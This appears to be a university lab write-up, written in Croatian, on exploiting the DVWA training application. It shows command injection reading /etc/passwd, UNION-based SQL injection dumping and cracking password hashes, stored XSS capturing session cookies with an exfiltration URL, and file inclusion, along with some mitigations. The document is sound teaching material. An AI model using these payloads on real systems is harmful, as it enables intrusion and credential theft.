@@ -1,0 +1,104 @@
+SRS – Treća laboratorijska vježba
+Tema: Ranjivosti web aplikacija
+Student: Fran Galić, 0036546889
+Ak. god.: 2024./2025.
+
+1. Zadatak – Izvršavanje naredbi (Command Injection)
+
+Cilj zadatka bio je iskoristiti ranjivost aplikacije kako bi se prikazao sadržaj sistemske datoteke /etc/passwd.
+
+Postupak:
+U DVWA sučelju, u dijelu Command Injection, isprobao sam sljedeće naredbe:
+
+1 | ls /
+1 | ls /etc
+1 | cat /etc/passwd
+
+Rezultat je bio ispis sadržaja datoteke /etc/passwd, čime je potvrđena ranjivost aplikacije. Dio ispisa:
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
+
+Time je dokazano da korisnik može izvršavati sistemske naredbe, što predstavlja ozbiljan sigurnosni rizik.
+
+2. Zadatak – SQL Injection
+
+Cilj zadatka bio je korištenjem SQL injection ranjivosti dohvatiti hash lozinke korisnika Pablo Picasso.
+
+Prvo sam isprobao tautologiju:
+' OR '1'='1
+
+Nakon toga pokušao sam UNION napad:
+
+1' UNION SELECT 1, user, password FROM users #
+
+Pojavila se greška "different number of columns", pa sam pomoću naredbi:
+
+1' ORDER BY 1 #
+1' ORDER BY 2 #
+1' ORDER BY 3 #
+
+utvrdio da upit vraća 2 stupca. Nakon toga upit sam prilagodio:
+
+1' UNION SELECT user, password FROM users #
+
+Rezultat je prikazao korisnička imena i hash-eve:
+
+First name: pablo
+Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
+
+Hash sam spremio u datoteku:
+
+echo "0d107d09f5bbe40cade3de5c71e9e9b7" > hashes.txt
+
+Pomoću online alata dešifrirao sam hash i dobio lozinku: letmein
+
+3. Zadatak – XSS (Stored)
+
+Cilj zadatka bio je demonstrirati Stored XSS ranjivost i dohvatiti kolačiće korisnika.
+
+U DVWA → XSS (Stored) ubacio sam sljedeći JavaScript:
+
+<script>alert("Test")</script>
+<script>alert(document.cookie)</script>
+
+Nakon učitavanja stranice, pojavio se alert s kolačićima. Iz alert-a sam prepisao:
+
+PHPSESSID=j7evir2vijr751gb4phspo7eu2
+
+GET zahtjev s ovim podatkom, prema uputama, bio bi:
+
+http://mrepro.tel.fer.hr/srs?cookie=security=low;%20PHPSESSID=j7evir2vijr751gb4phspo7eu2&jmbag=00XXXXXXX
+
+Zaštita od XSS napada uključuje:
+- HTML escape korisničkih unosa
+- Korištenje sigurnih JS API-ja
+- Content Security Policy (CSP)
+- Validaciju na serveru
+- Blokiranje <script> tagova
+
+4. Zadatak – File Inclusion
+
+Cilj zadatka bio je pristup sistemskoj datoteci preko GET parametra.
+
+U početnom URL-u:
+
+http://192.168.56.101/vulnerabilities/fi/?page=include.php
+
+Zamijenio sam parametar:
+
+http://192.168.56.101/vulnerabilities/fi/?page=/etc/passwd
+
+Stranica je prikazala sadržaj /etc/passwd, što potvrđuje File Inclusion ranjivost.
+
+root:x:0:0:root:/root:/bin/bash
+...
+mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
+
+Zaštita:
+- Dozvoliti samo unaprijed definirane datoteke (whitelist)
+- Validacija ulaznog parametra
+- Onemogućiti izravno uključivanje putanje preko korisničkog inputa
+
+U ZIP arhivi prilažem i screenshot zaslona koji prikazuje uspješno učitanu datoteku /etc/passwd.
